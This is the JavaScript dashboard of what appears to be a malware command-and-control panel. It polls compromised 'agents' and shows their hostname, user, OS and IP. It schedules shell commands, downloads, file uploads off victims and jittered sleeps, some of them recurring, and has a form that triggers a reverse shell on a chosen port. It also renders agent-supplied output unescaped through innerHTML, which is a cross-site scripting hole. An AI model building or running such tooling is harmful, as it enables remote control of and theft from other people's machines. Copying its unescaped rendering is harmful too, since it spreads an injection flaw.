/* ================= AGENTS ================= */
async function updateAgents() {
    try {
        const res = await fetch("/agents-data");
        const agents = await res.json();
        const tbody = document.getElementById("agentsBody");
        tbody.innerHTML = "";
        document.getElementById("totalAgents").textContent = `Total : ${agents.length}`;
        // ✅ SORT by last_seen (most recent first)
        agents.sort((a, b) => {
            // Step 1: online status priority
            if (a.online !== b.online) {
                return b.online - a.online; // true(1) comes before false(0)
            }

            // Step 2: last_seen (descending)
            const timeA = a.last_seen || 0;
            const timeB = b.last_seen || 0;
            return timeB - timeA;
        });
        const last4agents = agents.slice(0, 4);
        last4agents.forEach(a => {
            let id = a.id;

            // status
            let status = a.online ? "online" : "offline";
            let badgeClass = a.online ? "status-online" : "status-offline";

            let seconds = Math.floor(Date.now() / 1000 - a.last_seen);

            let row = document.createElement("tr");

            // store clean status for filtering
            row.dataset.status = status;

            row.innerHTML = `
                <td><span class="badge ${badgeClass}">
                    ${status.charAt(0).toUpperCase() + status.slice(1)}
                </span></td>
                <td>${id}</td>
                <td>${a.hostname || ""}</td>
                <td>${a.user || ""}</td>
                <td>${a.os || ""}</td>
                <td>${a.ip || ""}</td>
                <td>${seconds}s ago</td>
            `;

            tbody.appendChild(row);
        });

        // apply filters AFTER table is built
        applyAgentFilters();

    } catch (e) {
        console.error(e);
    }
}


/* ================= TASKS ================= */
async function updateTasks() {
    try {
        const res = await fetch("/tasks-data");
        const tasks = await res.json();
        const tbody = document.getElementById("tasksBody");
        tbody.innerHTML = "";
        // Convert tasks object to array with UUID
        const tasksArray = Object.entries(tasks).map(([uuid, t]) => ({
            uuid,
            ...t
        }));
        document.getElementById("totalTasks").textContent = `Total: ${tasksArray.length}`;
        // ✅ Sort: Pending → Completed → Failed, then by scheduled_at (newest first)
        tasksArray.sort((a, b) => {
            const getPriority = (status) => {
                switch ((status || "").toLowerCase()) {
                    case "pending": return 0;
                    case "completed": return 1;
                    case "failed": return 2;
                    default: return 3;
                }
            };

            const priorityA = getPriority(a.status);
            const priorityB = getPriority(b.status);

            if (priorityA !== priorityB) {
                return priorityA - priorityB;
            }

            const parseTime = (val) => {
                if (!val) return 0;
                const t = new Date(val).getTime();
                return isNaN(t) ? 0 : t;
            };

            return parseTime(b.scheduled_at) - parseTime(a.scheduled_at);
        });

        // Take only top 4
        const last4Tasks = tasksArray.slice(0, 4);

        // Render
        last4Tasks.forEach(t => {
            let row = document.createElement("tr");

            // ✅ Status from DB
            let status = (t.status || "pending").toLowerCase();
            let badge = "bg-secondary";

            if (status === "pending") badge = "bg-warning";
            else if (status === "success") badge = "bg-success";
            else if (status === "failure") badge = "bg-danger";

            const displayStatus = status.charAt(0).toUpperCase() + status.slice(1);

            // Row styling
            if (status === "completed") {
                row.classList.add("task-completed");
            }

            // Format executed_at
            const executedAt = t.executed_at
                ? (() => {
                    const date = new Date(t.executed_at);
                    return isNaN(date.getTime()) ? "—" : date.toLocaleString();
                })()
                : "—";

            row.innerHTML = `
                <td><span class="badge ${badge}">${displayStatus}</span></td>
                <td>${t.agent_id || ""}</td>
                <td>${t.task?.type || ""}: ${t.task?.command || t.task?.url || t.task?.path_to_file || ""}</td>
                <td>${t.output || "Waiting for result..."}</td>
                <td>${t.scheduled_at || "—"}</td>
                <td>${executedAt}</td>
                <td>${t.recurring_every || "—"}</td>
                <td>${t.uuid}</td>
                <td>
                    <button class="btn btn-sm btn-outline-danger" onclick="deleteTask('${t.uuid}')">
                        Delete
                    </button>
                </td>
            `;

            tbody.appendChild(row);
        });

    } catch (e) {
        console.error(e);
    }
}

/* ================= DELETE TASK ================= */
function deleteTask(uuid) {
    if (!confirm("Delete task?")) return;

    fetch("/tasks/" + uuid, {
        method: "DELETE",
        headers: {
            "Authorization": "Bearer " + API_KEY,
            "Content-Type": "application/json"
        }
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === "deleted") {
            // remove the row from the table
            const row = document.querySelector(`#tasksBody tr td:last-child button[onclick*="${uuid}"]`).closest("tr");
            if (row) row.remove();
        } else {
            alert("Failed to delete task: " + (data.error || "Unknown error"));
        }
    })
    .catch(err => {
        console.error(err);
        alert("Network or server error");
    });
}

/* ================= SEND TASK ================= */
document.getElementById("taskForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    // --- Get form values ---
    const agentId = document.getElementById("agentId").value.trim();
    const agentGroup = document.getElementById("agentGroup").value.trim();
    const type = document.getElementById("taskType").value;
    const cmd = document.getElementById("taskCommand").value.trim();
    const extra = document.getElementById("taskExtra").value.trim();
    let scheduledAtInput = document.getElementById("taskScheduledAt").value;
    let recurringEveryInput = document.getElementById("recurringEveryInput").value;

    // --- Build task object ---
    let task = { type };

    if (type === "shell") {
        task.command = cmd;
    } else if (type === "download") {
        task.url = cmd;
        task.save_as = extra;
    } else if (type === "upload") {
        task.path_to_file = cmd;
    } else if (type === "sleep") {
        task.min = parseInt(cmd) || 5;
        task.max = parseInt(extra) || 10;
    }

    // --- Handle scheduled_at ---
    if (!scheduledAtInput) {
        // Admin left blank → use current UTC time
        scheduledAtInput = new Date().toISOString();
    } else {
        // Admin chose a date → convert local datetime to full ISO UTC string
        // Append ":00" if seconds are missing (datetime-local returns "YYYY-MM-DDTHH:MM")
        const localDateTime = scheduledAtInput.includes(":") && scheduledAtInput.length === 16
            ? scheduledAtInput + ":00"
            : scheduledAtInput;
        const date = new Date(localDateTime);
        scheduledAtInput = date.toISOString();
    }
let recurringEvery = null; // Default to null
if (recurringEveryInput && recurringEveryInput.trim() !== "") {
    const parsed = parseInt(recurringEveryInput);
    recurringEvery = isNaN(parsed) ? null : parsed;
}

const bodyData = {
        id: agentId,
        task: task,
        scheduled_at: scheduledAtInput,
        recurring_every: recurringEvery,
        agent_group: agentGroup
    };

try {
    // --- Send task to server ---
    const response = await fetch("/task", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer " + API_KEY
        },
        body: JSON.stringify(bodyData)
    });

    if (response.ok) {
        console.log("Task sent successfully! Attempting reset...");
        // Clear the form only if the request was successful
        document.getElementById("taskForm").reset();
        // If you have a specific div for recurringEvery, clear it manually if needed
        updateTasks();
    } else {
        console.error("Server returned an error:", response.statusText);
    }
} catch (error) {
    console.error("Failed to send task:", error);
}
});

/* ================= CREATE AGENT ================= */
document.getElementById("createAgentForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const messageBox = document.getElementById("createAgentMessage");
    messageBox.innerHTML = "";

    const payload = {
        id: document.getElementById("newAgentId").value.trim(),
        group: document.getElementById("newAgentGroup").value.trim(),
        username: document.getElementById("newUsername").value.trim(),
        password: document.getElementById("newPassword").value.trim()
    };

    try {
        const res = await fetch("/agent-create", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": "Bearer " + API_KEY
            },
            body: JSON.stringify(payload)
        });

        const data = await res.json();

        if (res.ok && Object.values(data)[0] === "created") {
            messageBox.innerHTML = `<div class="alert alert-success">Agent created successfully</div>`;
            document.getElementById("createAgentForm").reset();

            // optional: refresh agents list
            if (typeof updateAgents === "function") updateAgents();
        } else {
            messageBox.innerHTML = `<div class="alert alert-danger">
                ${data.error || "Failed to create agent"}
            </div>`;
        }

    } catch (err) {
        console.error(err);
        messageBox.innerHTML = `<div class="alert alert-danger">
            Network or server error
        </div>`;
    }
});

/* ================= CREATE RevShell ================= */
document.getElementById("createRevShellForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const messageBox = document.getElementById("createRevShellMessage");
    messageBox.innerHTML = "";

    const payload = {
        agent_id: document.getElementById("revAgentId").value.trim(),
        port: document.getElementById("Port").value.trim(),

    };

    try {
        const res = await fetch("/revshell", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": "Bearer " + API_KEY
            },
            body: JSON.stringify(payload)
        });

        const data = await res.json();

        if (res.ok && data.status === "executed") {
            messageBox.innerHTML = `<div class="alert alert-success">Reverse Shell created successfully</div>`;
            document.getElementById("createRevShellForm").reset();


        } else {
            messageBox.innerHTML = `<div class="alert alert-danger">
                ${data.error || "Failed to create Revshell"}
            </div>`;
        }

    } catch (err) {
        console.error(err);
        messageBox.innerHTML = `<div class="alert alert-danger">
            Network or server error
        </div>`;
    }
});
/* ================= AUTO REFRESH ================= */
updateAgents();
updateTasks();
setInterval(updateAgents, 2000);
setInterval(updateTasks, 2000);
